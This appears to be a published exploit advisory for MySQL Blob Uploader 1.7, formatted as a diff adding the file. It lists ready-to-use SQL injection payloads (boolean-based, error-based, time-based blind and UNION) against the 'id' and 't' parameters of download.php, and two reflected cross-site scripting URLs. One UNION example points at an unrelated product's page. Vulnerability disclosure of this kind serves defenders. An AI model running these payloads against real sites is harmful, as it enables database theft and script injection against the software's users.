@@ -1,0 +1,72 @@
+# Exploit Title: MySQL Blob Uploader 1.7 - 'download.php' SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/mysql-file-and-image-uploader-and-sharing-blob-file-server/17748300
+# Version: 1.7 - seventh update
+# Category: Webapps
+# Tested on: Kali linux
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+Type : boolean-based blind
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44' AND 4775=4775 AND 'yvnT'='yvnT&t=files
+
+Type : error-based
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44' AND (SELECT 7995 FROM(SELECT
+COUNT(*),CONCAT(0x71766b7071,(SELECT
+(ELT(7995=7995,1))),0x71786b7671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VOHb'='VOHb&t=files
+
+Type : AND/OR time-based blind
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44' AND SLEEP(5) AND 'GnhY'='GnhY&t=files
+
+Type : UNION query
+Demo :
+http://test.com/EasyFileUploader/settings-users-edit.php?id=1
+Payload : id=-9508' UNION ALL SELECT
+NULL,NULL,NULL,NULL,CONCAT(0x71766b7071,0x6267544b5552795353544744426577526b47544d477553476d576442544152546e4a456b586c726d,0x71786b7671),NULL--
+wxis&t=files
+
+
+
+Parameter : t
+
+Type : boolean-based blind
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44&t=files` WHERE 6575=6575 AND 6608=6608#
+
+Type : error-based
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44&t=files` WHERE 5293=5293 AND (SELECT 1625 FROM(SELECT
+COUNT(*),CONCAT(0x71766b7071,(SELECT
+(ELT(1625=1625,1))),0x71786b7671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OpVv
+
+Type : AND/OR time-based blind
+Demo :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=files
+Payload : id=44&t=files` WHERE 6736=6736 AND (SELECT * FROM
+(SELECT(SLEEP(5)))GjCP)-- UaZE
+
+====================================================
+
+# PoC : XSS :
+
+Payload(1) :
+http://test.com/MySqlBlobUploader/download.php?id=%27%20%3C/script%3E%3Cscript%3Ealert%28%27akkus+keyney%27%29%3C/script%3E%E2%80%98;&t=files
+
+Payload(2) :
+http://test.com/MySqlBlobUploader/download.php?id=44&t=%27%20%3C/script%3E%3Cscript%3Ealert%28%27akkus+keyney%27%29%3C/script%3E%E2%80%98
+;
